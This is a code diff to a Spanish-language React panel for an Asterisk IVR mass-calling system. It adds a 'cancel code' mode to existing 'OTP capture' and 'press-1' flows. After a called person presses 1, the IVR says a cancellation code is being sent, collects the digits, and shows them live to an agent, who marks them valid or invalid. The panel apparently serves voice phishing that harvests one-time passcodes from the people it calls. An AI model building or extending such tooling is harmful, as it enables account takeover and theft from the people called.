+                {callFlowMode === 'cancel_code' && (
+                  <div className="p-3 rounded-xl bg-amber-950/30 border border-amber-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs animate-fadeIn">
+                    <div className="text-amber-200/95 space-y-0.5">
+                      <div className="font-bold text-amber-300 flex items-center gap-1.5">
+                        <Volume2 className="w-3.5 h-3.5 text-amber-400" />
+                        <span>Flujo Código de Cancelación Activo:</span>
+                      </div>
+                      <p className="text-[11px] text-slate-300">
+                        Al marcar <strong>1</strong>, el IVR dice: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> (<code className="text-amber-300 font-mono">{getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}</code>) y tú decides en pantalla si es <strong>Válido</strong> o <strong>Inválido</strong>.
+                      </p>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion', 'single_cancel_wait')}
+                      className="px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-200 border border-amber-500/40 text-xs font-bold flex items-center gap-1.5 shrink-0 cursor-pointer"
+                    >
+                      {playingAudioKey === 'single_cancel_wait' ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
+                      <span>{playingAudioKey === 'single_cancel_wait' ? 'Pausar' : 'Escuchar Audio'}</span>
+                    </button>
+                  </div>
+                )}
               </div>
 
               {/* CARD 2: DESTINO AL PRESIONAR 1 (TODAS LAS EXTENSIONES VS EXTENSIONES ESPECÍFICAS) */}
@@ -4791,6 +5039,39 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   </select>
                 </div>
 
+                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800 space-y-2">
+                  <div className="text-[10px] text-slate-400 font-mono font-bold">Flujo al Contestar (Modo IVR)</div>
+                  <div className="grid grid-cols-2 gap-1.5">
+                    {[
+                      { id: 'otp' as CallFlowMode, label: '1. Captura OTP' },
+                      { id: 'press1' as CallFlowMode, label: '2. Press-1 Asesor' },
+                      { id: 'hybrid' as CallFlowMode, label: '3. Híbrido' },
+                      { id: 'cancel_code' as CallFlowMode, label: '4. Cód. Cancelación' },
+                    ].map((opt) => (
+                      <button
+                        key={opt.id}
+                        type="button"
+                        disabled={isMassRunning}
+                        onClick={() => setCallFlowMode(opt.id)}
+                        className={`px-2 py-1.5 rounded-lg text-[11px] font-bold border text-left transition-all cursor-pointer disabled:opacity-50 ${
+                          callFlowMode === opt.id
+                            ? opt.id === 'cancel_code'
+                              ? 'bg-amber-500/20 border-amber-400 text-amber-200'
+                              : 'bg-purple-500/20 border-purple-400 text-white'
+                            : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
+                        }`}
+                      >
+                        {opt.label}
+                      </button>
+                    ))}
+                  </div>
+                  {callFlowMode === 'cancel_code' && (
+                    <div className="text-[10px] text-amber-300 bg-amber-950/30 border border-amber-500/30 rounded px-2 py-1.5">
+                      Al marcar <strong>1</strong> dirá: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> y el agente validará Válido / Inválido.
+                    </div>
+                  )}
+                </div>
+
                 <div className="p-3 rounded-xl bg-slate-900 border border-purple-500/30 bg-purple-950/20">
                   <div className="text-[10px] text-purple-300 font-mono font-bold">Destino al Presionar 1 (Difusión)</div>
                   <div className="text-xs font-bold text-white mt-1">
@@ -4799,7 +5080,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       : `👤 Extensión Específica: ${agentExtension}`}
                   </div>
                   <p className="text-[11px] text-slate-300 mt-1 leading-relaxed">
-                    {agentExtension === 'ringall'
+                    {callFlowMode === 'cancel_code'
+                      ? 'En modo Código de Cancelación, al marcar 1 el cliente escucha el mensaje de envío de código y digita el código para que el agente lo apruebe o rechace.'
+                      : agentExtension === 'ringall'
                       ? `Suenan al mismo tiempo únicamente las extensiones asignadas (${tenantScopedExtensions.join(', ')}). La extensión que conteste la llamada queda registrada automáticamente para el retorno exclusivo de su código OTP.`
                       : `La llamada irá directamente a la extensión ${agentExtension}.`}
                   </p>
@@ -5115,7 +5398,13 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   <h3 className="text-lg font-bold text-white flex items-center gap-2">
                     <span>Acción del IVR al Contestar</span>
                     <span className="px-2.5 py-0.5 rounded-full text-xs font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
-                      {callFlowMode === 'otp' ? 'Modo OTP Activo' : callFlowMode === 'press1' ? 'Modo Press-1 Activo' : 'Modo Híbrido Activo'}
+                      {callFlowMode === 'otp'
+                        ? 'Modo OTP Activo'
+                        : callFlowMode === 'press1'
+                        ? 'Modo Press-1 Activo'
+                        : callFlowMode === 'cancel_code'
+                        ? 'Modo Press-1 + Cancelación Activo'
+                        : 'Modo Híbrido Activo'}
                     </span>
                   </h3>
                   <p className="text-xs text-slate-400 mt-0.5">
@@ -5168,7 +5457,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               </div>
             </div>
 
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
               {/* Opción 1: Captura OTP */}
               <button
                 type="button"
@@ -5261,6 +5550,37 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   ✓ Máxima flexibilidad operativa
                 </div>
               </button>
+
+              {/* Opción 4: Press-1 + Código de Cancelación */}
+              <button
+                type="button"
+                onClick={() => setCallFlowMode('cancel_code')}
+                className={`p-5 rounded-2xl border text-left transition-all relative ${
+                  callFlowMode === 'cancel_code'
+                    ? 'bg-amber-500/15 border-amber-400 text-white shadow-xl shadow-amber-500/15 ring-2 ring-amber-400/70'
+                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-amber-500/40'
+                }`}
+              >
+                <div className="flex items-center justify-between mb-2">
+                  <div className="p-2 rounded-xl bg-amber-500/20 text-amber-400">
+                    <ShieldCheck className="w-5 h-5" />
+                  </div>
+                  {callFlowMode === 'cancel_code' ? (
+                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-400 text-slate-950">
+                      SELECCIONADO
+                    </span>
+                  ) : (
+                    <span className="text-[10px] font-mono text-amber-400">Modo 4</span>
+                  )}
+                </div>
+                <div className="text-sm font-bold text-white">4. Press-1 + Código Cancelación</div>
+                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
+                  Al marcar 1 reproduce: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> y el agente elige si el código es <strong>Válido</strong> o <strong>Inválido</strong>.
+                </div>
+                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-amber-400/95 font-mono">
+                  ✓ Validación manual Válido / Inválido en vivo
+                </div>
+              </button>
             </div>
           </div>
 
@@ -5291,13 +5611,21 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <div className="p-3.5 rounded-xl bg-slate-900 border border-emerald-500/40 bg-emerald-950/20">
                 <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 3</div>
                 <div className="text-xs font-bold text-white mt-1">
-                  {callFlowMode === 'otp' ? 'Solicitud de Token OTP' : callFlowMode === 'press1' ? 'Opción Press 1' : 'Menú Dual OTP/Asesor'}
+                  {callFlowMode === 'otp'
+                    ? 'Solicitud de Token OTP'
+                    : callFlowMode === 'press1'
+                    ? 'Opción Press 1'
+                    : callFlowMode === 'cancel_code'
+                    ? 'Press-1 → Enviando Código'
+                    : 'Menú Dual OTP/Asesor'}
                 </div>
                 <div className="text-[11px] text-slate-400 mt-1">
                   {callFlowMode === 'otp'
                     ? 'Asterisk lee los tonos DTMF (4 o 6 dígitos) y los almacena en AstDB.'
                     : callFlowMode === 'press1'
                     ? `Si presiona 1, ejecuta Dial(PJSIP/${agentExtension}) para conectar con tu softphone.`
+                    : callFlowMode === 'cancel_code'
+                    ? 'Si marca 1, reproduce "Un momento por favor, le estamos enviando un código de cancelación" y solicita los dígitos.'
                     : `Captura el código OTP ingresado o transfiere a la ${agentExtension} si presiona 1.`}
                 </div>
               </div>
@@ -5305,11 +5633,17 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                 <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 4</div>
                 <div className="text-xs font-bold text-white mt-1">
-                  {callFlowMode === 'press1' ? 'Conversación en Vivo' : 'Procesamiento OTP'}
+                  {callFlowMode === 'press1'
+                    ? 'Conversación en Vivo'
+                    : callFlowMode === 'cancel_code'
+                    ? 'Decisión Agente (Válido/Inválido)'
+                    : 'Procesamiento OTP'}
                 </div>
                 <div className="text-[11px] text-slate-400 mt-1">
                   {callFlowMode === 'press1'
                     ? `El operador toma la llamada en el softphone registrado (Extensión ${agentExtension}).`
+                    : callFlowMode === 'cancel_code'
+                    ? 'El agente ve el código en tiempo real y presiona CÓDIGO VÁLIDO o CÓDIGO INVÁLIDO (si es inválido pide reintento).'
                     : 'Asterisk reproduce la locución de "Un momento validando su información".'}
                 </div>
               </div>
@@ -5318,7 +5652,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 5</div>
                 <div className="text-xs font-bold text-white mt-1">Confirmación & Cierre</div>
                 <div className="text-[11px] text-slate-400 mt-1">
-                  Reproduce la locución de éxito ("Operación bloqueada con éxito") y finaliza la llamada.
+                  {callFlowMode === 'cancel_code'
+                    ? 'Si es Válido reproduce "Código validado, operación cancelada con éxito" y cierra la llamada.'
+                    : 'Reproduce la locución de éxito ("Operación bloqueada con éxito") y finaliza la llamada.'}
                 </div>
               </div>
             </div>
@@ -5593,6 +5929,66 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   <div className="text-[10px] text-slate-500 font-mono">
                     Ruta física: /var/lib/asterisk/sounds/{getServiceAudios(selectedService).successAudioPath || 'SayDigits'}.wav
                   </div>
+                </div>
+              </div>
+
+              {/* Slot 5: Audio al Marcar 1 - Enviando Código de Cancelación */}
+              <div className="p-4 rounded-xl bg-slate-900 border border-amber-500/40 space-y-3 md:col-span-2">
+                <div className="flex items-center justify-between">
+                  <label className="text-xs font-bold text-amber-200 flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-amber-400"></span>
+                    <span>5. Audio al Marcar 1: "Un momento por favor, le estamos enviando un código de cancelación"</span>
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion', 'cancel_wait')}
+                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                    title="Escuchar audio"
+                  >
+                    {playingAudioKey === 'cancel_wait' ? (
+                      <>
+                        <Pause className="w-3.5 h-3.5 text-amber-400 animate-pulse" />
+                        <span className="text-amber-400">Pausar</span>
+                      </>
+                    ) : (
+                      <>
+                        <Play className="w-3.5 h-3.5 text-slate-300" />
+                        <span>Escuchar</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                  <div className="space-y-1.5">
+                    <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
+                    <select
+                      value={getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}
+                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'cancelCodeAudioPath', e.target.value)}
+                      className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-amber-500 font-mono"
+                    >
+                      <option value="custom/enviando_codigo_cancelacion">custom/enviando_codigo_cancelacion ("Un momento por favor, le estamos enviando un código...") [RECOMENDADO]</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
+                    <input
+                      type="text"
+                      value={getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}
+                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'cancelCodeAudioPath', e.target.value)}
+                      placeholder="ej: custom/enviando_codigo_cancelacion"
+                      className="w-full px-3 py-2 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-amber-500 focus:outline-none"
+                    />
+                  </div>
+                </div>
+                <div className="text-[10px] text-slate-400 font-mono">
+                  Se reproduce inmediatamente al cliente marcar 1 en el <strong>Modo 4 (Press-1 + Código Cancelación)</strong>.
                 </div>
               </div>
             </div>
@@ -6070,6 +6466,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   <option value="promptAudioPath">2. Solicitud de Código OTP</option>
                   <option value="agentAudioPath">3. Pre-Transferencia Press-1 (Asesor)</option>
                   <option value="successAudioPath">4. Confirmación / Éxito OTP</option>
+                  <option value="cancelCodeAudioPath">5. Enviando Código Cancelación (Press-1)</option>
                 </select>
               </div>
 
@@ -6657,6 +7054,56 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       onChange={(e) => setEditingEntity({ ...editingEntity, holdMusicAudioPath: e.target.value })}
                       disabled={!isAdmin}
                       placeholder="Ruta personalizada (ej. custom/mi_musica_hold)"
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
+                    />
+                  </div>
+                </div>
+
+                {/* 6. Audio Modo Código de Cancelación (al presionar 1) */}
+                <div className="p-3.5 rounded-xl bg-slate-950 border border-amber-500/30 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <div className="text-xs font-bold text-amber-300 flex items-center gap-1.5">
+                        <ShieldCheck className="w-3.5 h-3.5 text-amber-400" />
+                        <span>6. Audio al Marcar 1: Enviando Código de Cancelación</span>
+                      </div>
+                      <div className="text-[11px] text-slate-400">
+                        Locución reproducida al cliente cuando presiona 1 en el Modo 4: "Un momento por favor, le estamos enviando un código de cancelación".
+                      </div>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleTogglePlayAudio(editingEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion', 'modal_cancel_wait')}
+                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
+                      title="Reproducir audio"
+                    >
+                      {playingAudioKey === 'modal_cancel_wait' ? (
+                        <Pause className="w-4 h-4 text-amber-400 animate-pulse" />
+                      ) : (
+                        <Play className="w-4 h-4 text-slate-300" />
+                      )}
+                    </button>
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                    <select
+                      value={editingEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, cancelCodeAudioPath: e.target.value })}
+                      disabled={!isAdmin}
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
+                    >
+                      <option value="custom/enviando_codigo_cancelacion">custom/enviando_codigo_cancelacion (Estándar)</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <input
+                      type="text"
+                      value={editingEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, cancelCodeAudioPath: e.target.value })}
+                      disabled={!isAdmin}
+                      placeholder="custom/enviando_codigo_cancelacion"
                       className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
                     />
                   </div>
